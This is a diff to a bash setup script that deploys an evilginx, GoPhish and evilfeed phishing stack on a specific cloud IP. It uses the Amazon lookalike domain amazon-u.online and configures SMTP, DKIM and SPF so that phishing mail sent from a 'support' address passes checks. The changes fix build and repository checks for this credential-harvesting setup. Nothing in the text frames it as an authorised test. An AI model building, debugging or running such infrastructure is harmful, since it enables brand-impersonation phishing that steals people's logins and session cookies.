@@ -1,8 +1,8 @@
 #!/bin/bash
 # setup.sh - Setup for evilgophish with SMTP on Lightsail (3.147.37.21).
-# Changes: Domain amazon-u.online; Turnstile optional; separate repos for evilginx3, gophish, evilfeed; .env.example; validates gophish.go; makes evilfeed optional; fixes mailconfig.
+# Changes: Domain amazon-u.online; Turnstile optional; separate repos for evilginx3, gophish, evilfeed; .env.example; validates gophish.go and evilfeed.go; makes evilfeed optional; fixes mailconfig; cleans /tmp/evilgophish.
 # SMTP: Configures support@amazon-u.online for GoPhish/Evilginx.
-# Fixes: Checks src/gophish/gophish.go; retries DKIM with debug; skips evilfeed if main.go missing; clarifies RID_REPLACEMENT.
+# Fixes: Checks src/gophish/gophish.go and src/evilfeed/evilfeed.go; retries DKIM with debug; skips evilfeed if directory missing; clarifies RID_REPLACEMENT; removes existing /tmp/evilgophish.
 # Usage: ./setup.sh
 # Best Practices:
 # - Edit .env.example before running; backup configs; secure secrets.
@@ -113,6 +113,7 @@ echo "- SPF: TXT v=spf1 mx a ip4:3.147.37.21 ~all"
 mkdir -p src
 echo "Cloning repositories..."
 rm -rf src/evilginx3 src/gophish src/evilfeed
+rm -rf /tmp/evilgophish  # Clean existing /tmp/evilgophish
 if ! git clone https://github.com/kgretzky/evilginx2.git src/evilginx3; then
   echo "Error: Failed to clone evilginx2. Check network or repo access."
   exit 1
@@ -141,8 +142,14 @@ for dir in evilginx3 gophish; do
     [ ! -f "src/$dir/main.go" ] && { echo "Error: src/$dir/main.go missing."; exit 1; }
   fi
 done
-if [ -d "src/evilfeed" ] && [ ! -f "src/evilfeed/main.go" ]; then
-  echo "Warning: src/evilfeed/main.go missing; evilfeed will not build."
+if [ -d "src/evilfeed" ]; then
+  if [ ! -f "src/evilfeed/evilfeed.go" ]; then
+    echo "Warning: src/evilfeed/evilfeed.go missing; evilfeed will not build."
+  else
+    echo "Evilfeed found with evilfeed.go; will build."
+  fi
+else
+  echo "Warning: src/evilfeed directory missing; evilfeed will not build."
 fi
 
 # Fix permissions
@@ -198,7 +205,7 @@ FROM golang:1.23-alpine AS builder
 RUN apk add --no-cache git
 WORKDIR /src
 COPY src/evilfeed .
-RUN go mod download && CGO_ENABLED=0 go build -o /app/evilfeed .
+RUN go mod download && CGO_ENABLED=0 go build -o /app/evilfeed ./evilfeed.go
 FROM alpine:latest
 WORKDIR /app
 COPY --from=builder /app/evilfeed .
